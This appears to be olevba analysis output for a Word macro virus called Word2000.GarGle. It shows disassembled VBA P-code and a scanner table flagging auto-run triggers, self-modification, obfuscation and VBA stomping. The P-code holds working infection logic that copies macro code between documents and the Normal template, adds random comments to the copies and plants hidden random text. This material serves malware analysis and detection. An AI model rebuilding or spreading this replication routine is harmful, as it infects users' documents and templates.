' 	Ld s 
' 	LitDI2 0x0001 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0015 
' 	St s 
' 	EndIf 
' Line #122:
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St a$ 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St B$ 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c$ 
' Line #123:
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d$ 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St e$ 
' 	BoS 0x0000 
' 	Ld a$ 
' 	Ld B$ 
' 	Add 
' 	Ld c$ 
' 	Add 
' 	Ld d$ 
' 	Add 
' 	Ld e$ 
' 	Add 
' 	St F$ 
' Line #124:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	St redx 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	St bluex 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	St greenx 
' 	BoS 0x0000 
' 	Ld DocWords 
' 	Ld wdWord 
' 	Sub 
' 	St DocLasTWord 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld DocLasTWord 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	Set Gargle 
' 	BoS 0x0000 
' 	StartWithExpr 
' 	Ld Gargle 
' 	With 
' 	BoS 0x0000 
' 	Ld wdWord 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	UMi 
' 	ParamNamed Count 
' 	ArgsMemCallWith MoveStart 0x0002 
' 	BoS 0x0000 
' 	ArgsMemCallWith Select 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' Line #125:
' 	LitDI2 0x0064 
' 	LitDI2 0x0063 
' 	Sub 
' 	Paren 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Hidden 
' 	BoS 0x0000 
' 	Ld s 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' 	BoS 0x0000 
' 	Ld redx 
' 	Ld greenx 
' 	Ld bluex 
' 	ArgsLd RGB 0x0003 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Color 
' 	BoS 0x0000 
' 	Ld F$ 
' 	Paren 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #126:
' Line #127:
' 	Dim 
' 	VarDefn Norm
' 	VarDefn NormCode
' 	VarDefn NormLines
' 	VarDefn Doc
' 	VarDefn DocCode
' 	VarDefn DocLines
' Line #128:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set Norm 
' Line #129:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set Doc 
' Line #130:
' 	SetStmt 
' 	Ld Doc 
' 	MemLd CodeModule 
' 	Set DocCode 
' Line #131:
' 	SetStmt 
' 	Ld Norm 
' 	MemLd CodeModule 
' 	Set NormCode 
' Line #132:
' Line #133:
' 	LitDI2 0x0017 
' 	LitDI2 0x0001 
' 	Ld DocCode 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #134:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld DocCode 
' 	MemLd countoflines 
' 	For 
' Line #135:
' 	Ld y 
' 	LitStr 0x0006 "Gargle"
' 	Ld DocCode 
' 	ArgsMemCall replacelines 0x0002 
' Line #136:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #137:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld NormCode 
' 	MemLd countoflines 
' 	For 
' Line #138:
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St a$ 
' Line #139:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Ld NormCode 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0002 " '"
' 	Add 
' 	Ld a$ 
' 	Add 
' 	St a 
' Line #140:
' 	LitDI2 0x001A 
' 	Ld x 
' 	Add 
' 	Ld a 
' 	Ld DocCode 
' 	ArgsMemCall insertlines 0x0002 
' Line #141:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #142:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	BoS 0x0000 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #143:
' 	EndIfBlock 
' Line #144:
' Line #145:
' 	LitDI2 0x0017 
' 	LitDI2 0x0001 
' 	Ld NormCode 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #146:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormCode 
' 	MemLd countoflines 
' 	For 
' Line #147:
' 	Ld y 
' 	LitStr 0x0006 "Gargle"
' 	Ld NormCode 
' 	ArgsMemCall replacelines 0x0002 
' Line #148:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #149:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld DocCode 
' 	MemLd countoflines 
' 	For 
' Line #150:
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x00BE 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St a$ 
' Line #151:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Ld DocCode 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0002 " '"
' 	Add 
' 	Ld a$ 
' 	Add 
' 	St a 
' Line #152:
' 	LitDI2 0x001A 
' 	Ld x 
' 	Add 
' 	Ld a 
' 	Ld NormCode 
' 	ArgsMemCall insertlines 0x0002 
' Line #153:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #154:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	BoS 0x0000 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #155:
' 	EndIfBlock 
' Line #156:
' 	QuoteRem 0x0000 0x000F "Word2000.GarGle"
' Line #157:
' 	QuoteRem 0x0000 0x0015 "By $MOOTHiE Da HuStla"
' Line #158:
' 	QuoteRem 0x0000 0x0007 "July 2k"
' Line #159:
' 	QuoteRem 0x0000 0x001B "Dedicated to my wife ChiQui"
' Line #160:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

